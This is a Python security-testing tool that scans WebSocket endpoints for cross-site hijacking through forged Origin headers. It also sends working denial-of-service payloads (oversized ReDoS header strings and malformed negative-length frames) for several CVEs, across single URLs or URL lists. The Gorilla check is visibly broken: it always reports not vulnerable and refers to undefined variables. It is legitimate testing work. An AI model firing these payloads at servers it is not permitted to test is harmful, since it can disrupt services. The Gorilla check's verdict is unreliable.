#!/usr/bin/env python

import argparse
import ssl
import time
import websocket
import requests
from cprint import *
from urllib.parse import urlparse

debug = False
cntn_timeout = 10
vuln_urls = []
vuln_reasons = []


def parse_args():
    parser = argparse.ArgumentParser(description="Security Testing and Enumeration of WebSockets (STEWS) Vulnerability Detection Tool")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Enable verbose tracing of communications")
    parser.add_argument("-d", "--debug", action="store_true",
                        help="Print each test case to track progress while running")
    parser.add_argument("-u", "--url",
                        help="URL to connect to")
    parser.add_argument("-f", "--file",
                        help="File containing URLs to check for valid WebSocket connections")
    parser.add_argument("-n", "--no-encryption", action="store_true",
                        help="Connect using ws://, not wss:// (default is wss://)")
    parser.add_argument("-k", "--nocert", action="store_true",
                        help="Ignore invalid SSL cert")
    parser.add_argument("-o", "--origin",
                        help="Set origin")
    parser.add_argument("-1", dest="CSWSH", action="store_true",
                        help="Test for generic Cross-site WebSocket Hijacking (CSWSH)")
    parser.add_argument("-2", dest="ws_redos_2021", action="store_true",
                        help="Test CVE-2021-32640 - ws Sec-Websocket-Protocol Regex DoS")
    parser.add_argument("-3", dest="regex_dos", action="store_true",
                        help="Test CVE-2020-7662 & 7663 - faye Sec-WebSocket-Extensions Regex DoS")
    parser.add_argument("-4", dest="gorilla_regex_dos", action="store_true",
                        help="Test CVE-2020-27813 - Gorilla DoS Integer Overflow")
    return parser.parse_args()


def ws_reconnect(ws, wsurl, opts, options):
    try:
        ws.connect(wsurl, skip_utf8_validation=True, timeout=cntn_timeout, **options)
    except Exception as e:
        print("Exception while trying to connect for mask tests: ", e)


def run_tests(arguments):
    # Create empty vars
    wsurl = ""
    options = {}
    opts = {}
    args = arguments

    # Set schema prefix
    if args.no_encryption:
        wsurl = "ws://" + args.url
    else:
        wsurl = "wss://" + args.url
    print("   Testing " + wsurl)
    # Set SSL options if certs should be ignored
    if args.nocert:
        opts = {"cert_reqs": ssl.CERT_NONE, "check_hostname": False}

    # Set origin if none is provided
    if args.origin is None:
        options["origin"] = "http://" + urlparse(wsurl).netloc
    # Raise exception if http schema is included in URLs
    if args.url.find("http://") == 0 or args.url.find("https://") == 0:
        raise Exception("URLs should not contain http:// or https:// - \
        please read the README and clean these from the input URLs")
    ws = websocket.WebSocket(sslopt=opts)
    if not (args.CSWSH or args.ws_redos_2021 or args.regex_dos or args.gorilla_regex_dos):
        raise Exception("+++REMEMBER: Choose at least one test to run")
    if args.CSWSH:
        CSWSH_test(ws, wsurl, arguments, opts, options)
    if args.ws_redos_2021:
        ws_redos_2021(ws, wsurl, arguments, opts, options)
    if args.regex_dos:
        regex_dos_test(ws, wsurl, arguments, opts, options)
    if args.gorilla_regex_dos:
        gorilla_regex_dos_test(ws, wsurl, arguments, opts, options)


def pretty_print_GET(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in
    this function because it is programmed to be pretty
    printed and may differ from the actual request.
    """
    print('{}\n{}\r\n{}\r\n\r\n'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items())
    ))


def CSWSH_try_connect(ws, wsurl, opts, options):
    if "origin" in options:
        headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13'}
    else:
        headers = {'Upgrade': 'websocket', 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13'}
    httpurl = ""
    if wsurl.find("wss://") >= 0:
        httpurl = wsurl.replace("wss://", "https://")
    else:
        httpurl = wsurl.replace("ws://", "http://")
    req = requests.Request('GET',httpurl,headers=headers)
    prepared = req.prepare()
    if debug:
        pretty_print_GET(prepared)
    try:  # Try connecting to endpoint
        resp = requests.get(httpurl,headers=headers,timeout=cntn_timeout)
        return_value = 0
        if debug:
            print("Response status code: " + str(resp.status_code))
        if int(resp.status_code) == 101:
            return_value = 1
        return return_value
    except Exception as e:
        if debug:
            print("Exception while trying to connect for CSWSH tests: ", e)
        return 0


def CSWSH_test(ws, wsurl, arguments, opts, options):
    # First vanilla connection attempt
    result1 = CSWSH_try_connect(ws, wsurl, opts, options)
    # If vanilla connection failed, don't continue
    if result1 == 0:
        if debug:
            print("Unable to successfully connect to endpoint with given parameters - please provide a working handshake request or endpoint URL")
    else:
        # https origin header
        options["origin"] = "https://" + urlparse(wsurl).netloc
        result2 = CSWSH_try_connect(ws, wsurl, opts, options)
        # null origin header (from https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
        options["origin"] = "null"
        result3 = CSWSH_try_connect(ws, wsurl, opts, options)
        # Safari unusual char parsing (from https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
        options["origin"] = "https://" + urlparse(wsurl).netloc + "`google.com"
        result4 = CSWSH_try_connect(ws, wsurl, opts, options)
        # Incorrect origin header
        options["origin"] = "http://www.google.com"
        result100 = CSWSH_try_connect(ws, wsurl, opts, options)
        # No Origin header (might work with Gorilla: https://github.com/gorilla/websocket/blob/e8629af678b7fe13f35dff5e197de93b4148a909/server.go#L87)
        del options["origin"]
        result101 = CSWSH_try_connect(ws, wsurl, opts, options)
        # Origin bypass check for unescaped period in regex
        options["origin"] = "http://" + urlparse(wsurl).netloc.replace(".", "A")
        result102 = CSWSH_try_connect(ws, wsurl, opts, options)
        options["origin"] = "http://" + urlparse(wsurl).netloc.replace(".", "A", 1)
        result103 = CSWSH_try_connect(ws, wsurl, opts, options)
        options["origin"] = "http://" + urlparse(wsurl).netloc.replace(".", "A", 2)
        result104 = CSWSH_try_connect(ws, wsurl, opts, options)
        # Does origin only search for a phrase, even if it's not the TLD?
        options["origin"] = "http://" + urlparse(wsurl).netloc + ".example.com"
        result105 = CSWSH_try_connect(ws, wsurl, opts, options)
        # Are arbitrary subdomains allowed?
        options["origin"] = "http://test." + urlparse(wsurl).netloc
        result106 = CSWSH_try_connect(ws, wsurl, opts, options)

    if result1 == 1:
        # Perform informational checks first
        if result2 == 1:
            cprint.ok(">>>Note: " + wsurl + " allowed http or https for origin")
        if result3 == 1:
            cprint.ok(">>>Note: " + wsurl + " allowed null origin")
        if result4 == 1:
            cprint.ok(">>>Note: " + wsurl + " allowed unusual char (possible parse error)")
        if result101 == 0:
            cprint.ok(">>>Note: " + wsurl + " requires an Origin header")
        # Perform vulnerability checks second
        if result100 == 1 or result101 == 1:
            reason = ">>>VANILLA CSWSH DETECTED: " + wsurl + " likely vulnerable to vanilla CSWSH (any origin)"
            cprint.err(reason)
            vuln_reasons.append(reason)
            vuln_urls.append(wsurl)
        elif result102 == 1 or result103 == 1 or result104 == 1 or result105 == 1 or result106 == 1:
            reason = ">>>CSWSH ORIGIN BYPASS DETECTED: " + wsurl + " vanilla CSWSH didn't work, but server origin check was bypassed (unescaped period)"
            cprint.err(reason)
            vuln_reasons.append(reason)
            vuln_urls.append(wsurl)


def protocol_try_connect(ws, proto_value, wsurl, opts, options):
    headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Sec-WebSocket-Protocol': proto_value, 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13'}
    httpurl = ""
    # Replace the WebSocket URL with a HTTP URL
    if wsurl.find("wss://") >= 0:
        httpurl = wsurl.replace("wss://", "https://")
    else:
        httpurl = wsurl.replace("ws://", "http://")
    req = requests.Request('GET',httpurl,headers=headers)
    prepared = req.prepare()
    if debug:
        pretty_print_GET(prepared)
    # websocket.enableTrace(True)
    ws = websocket.WebSocket(sslopt=opts)
    try:  # Try connecting to endpoint
        ws.connect(wsurl, header={'Sec-WebSocket-Protocol': proto_value}, timeout=cntn_timeout)
        if debug:
            print("Response status code: ", resp.status_code)
            print("Response headers: ", resp.headers)
    except Exception as e:
        if ws.getstatus() == 101:
            print("Exception while trying to connect for ws redos tests: ", e)


def ws_redos_2021(ws, wsurl, arguments, opts, options):
    # CVE-2021-32640 test
    regex_time_delta = 0.4  # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
    times = [0, 0, 0]
    times[0] = time.time()
    spaces = 30000
    protocol_payload = "b" + " " * spaces + "x"
    print("Sending payload 1")
    protocol_try_connect(ws, protocol_payload, wsurl, opts, options)
    times[1] = time.time()
    spaces = 66000
    protocol_payload = "b" + " " * spaces + "x"
    print("Sending payload 2")
    protocol_try_connect(ws, protocol_payload, wsurl, opts, options)
    times[2] = time.time()
    if times[1] - times[0] < (times[2] - times[1] - regex_time_delta):
        cprint.err(">>>VULNERABILITY DETECTED: server likely vulnerable to RegEx DoS CVE-2021-32640")
        cprint.err(wsurl)
        reason = ">>>Identifier: Longer payload delayed server response by " + str(times[2] - times[1]) + " seconds!"
        cprint.info(reason)
        cprint.info(">>>First response delayed by only " + str(times[1] - times[0]) + " seconds!")
        vuln_reasons.append(reason)
        vuln_urls.append(wsurl)
    else:
        cprint.ok("Not vulnerable to redos CVEs")


def extension_try_connect(ws, ext, wsurl, opts, options):
    headers = {'Upgrade': 'websocket', 'Origin': options["origin"], 'Sec-WebSocket-Key': 'U2NqiNJpRpRGdvagcfySUA==', 'Connection': 'Upgrade', 'Sec-WebSocket-Version': '13', 'Sec-WebSocket-Extensions': ext}
    # attempt_ws_connection(wsurl, headers)
    httpurl = ""
    # Replace the WebSocket URL with a HTTP URL
    if wsurl.find("wss://") >= 0:
        httpurl = wsurl.replace("wss://", "https://")
    else:
        httpurl = wsurl.replace("ws://", "http://")
    req = requests.Request('GET',httpurl,headers=headers)
    prepared = req.prepare()
    if debug:
        pretty_print_GET(prepared)
    s = requests.Session()
    try:  # Try connecting to endpoint
        resp = s.send(prepared, timeout=cntn_timeout)
        if debug:
            print("Extension: ", ext)
            print("Response status code: ", resp.status_code)
            print("Response headers: ", resp.headers)
        return_value = 0
        for val in resp.headers:
            if "sec-websocket-extensions" == val.lower():
                if debug:
                    print(">>>>>>Sec-WebSocket-Extensions response header:")
                    print(">>>>>>", resp.headers["Sec-WebSocket-Extensions"])
                return_value = 1
        return return_value
    except Exception as e:
        print("Exception while trying to connect for faye redos tests: ", e)
        return 0


def regex_dos_test(ws, wsurl, arguments, opts, options):
    # CVE-2020-7662 & CVE-2020-7663 test
    regex_time_delta = 0.4  # minimum time difference (in seconds) between 2nd and 3rd request that will trigger vuln alert
    # Loop through all extensions and try connecting
    extension_payloads = ['a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c', 'a;b="\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c\c']

    start = time.time()
    extension_try_connect(ws, extension_payloads[0], wsurl, opts, options)
    first_request_time = time.time() - start
    start = time.time()
    extension_try_connect(ws, extension_payloads[1], wsurl, opts, options)
    second_request_time = time.time() - start
    start = time.time()
    extension_try_connect(ws, extension_payloads[2], wsurl, opts, options)
    third_request_time = time.time() - start
    if first_request_time < second_request_time and second_request_time < (third_request_time - regex_time_delta):
        cprint.err(">>>VULNERABILITY DETECTED: server likely vulnerable to RegEx DoS CVE-2020-7662 or CVE-2020-7663")
        cprint.err(wsurl)
        reason = ">>>Identifier: Longer payload delayed server response by " + str(third_request_time - second_request_time) + " seconds!"
        cprint.info(reason)
        vuln_reasons.append(reason)
        vuln_urls.append(wsurl)
    else:
        cprint.ok("Not vulnerable to redos CVEs")


def zero_mask_key(_):
    return "\x00\x00\x00\x00"


def gorilla_regex_dos_test(ws, wsurl, arguments, opts, options):
    # CVE-2020-27813 test
    # Loop through all extensions and try connecting

    try:  # Try connecting to endpoint
        ws.set_mask_key(zero_mask_key)
        ws.connect(wsurl)
        # First, send a message with:
        # 0. Fin = false & rsv bits = 0 (x0_)
        # 1. binary opcode (x_2)
        # 2. mask = true (x8_)
        # 3. payload length = 1 (x_1)
        # 4. mask of 0000 (\x00\x00\x00\x00)
        # 5. payload value of A
        ws._send(b'\x02\x81\x00\x00\x00\x00A')
        print("Sent message 1")
        # Next, send a negative-length, non-final continuation frame
        # Second, send a message with:
        # 0. Fin = false & rsv bits = 0 (x0_)
        # 1. continuous opcode (x00)
        # 2. mask = true (xF_)
        # 3. payload length = 127 (xFF)
        # 4. Extended payload length = (\x80\x00\x00\x00\x00\x00\x00\x00)
        # 5. mask of 0000 (\x00\x00\x00\x00)
        ws._send(b'\x00\xFF\x80\x00\x00\x00\x00\x00\x00\x00')
        print("Sent message 2")
        ws._send(b'\x80\xFF\x00\x00\x00\x00\x00\x00\x00\x05')
        print("Sent message 3")
        # Third, send a message with:
        # 0. Fin = false & rsv bits = 0 (x0_)
        # 1. continuous opcode (x00)
        # 2. mask = false (x0_)
        # 3. payload length = 0 (x_0)
        # 4. mask of 0000 (\x00\x00\x00\x00)
        ws.send("BCDEF")
        print("Sent message 4")
        # print(ws.recv())
        ws.close()
    except Exception as e:
        print(e)

    if False:
        cprint.err(">>>VULNERABILITY DETECTED: server likely vulnerable to RegEx DoS CVE-2020-7662 or CVE-2020-7663")
        cprint.err(wsurl)
        reason = ">>>Identifier: Longer payload delayed server response by " + str(third_request_time - second_request_time) + " seconds!"
        cprint.info(reason)
        vuln_reasons.append(reason)
        vuln_urls.append(wsurl)
    else:
        cprint.ok("Not vulnerable to redos CVEs")


def main():
    global debug
    # Parse input arguments
    args = parse_args()

    # Set verbosity
    if args.verbose:
        websocket.enableTrace(True)
    # Set debug
    if args.debug:
        debug = True
    # Raise exception if no URL is provided
    if args.url is None and args.file is None:
        raise Exception("ERROR: Either a URL or file containing URLs must be provided")

    ############################################
    # Start here if a file argument was provided with many URLs to test
    ############################################
    if args.file is not None:
        urls_file = open(args.file, 'r')
        Lines = urls_file.readlines()
        cprint.ok("Found " + str(len(Lines)) + " URLS")
        count = 0
        for line in Lines:
            count = count + 1
            cprint.ok("On URL #" + str(count))
            args.url = line.strip()
            run_tests(args)
            if count % 25 == 0:
                print("====List of vulnerable URLs after " + str(count) + " urls===")
                print(vuln_urls)
                print(vuln_reasons)
    ############################################
    # Start here if a single URL argument was provided
    ############################################
    else:
        # Run all tests
        run_tests(args)
    print("====Full list of vulnerable URLs===")
    print(vuln_urls)
    print(vuln_reasons)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(e)
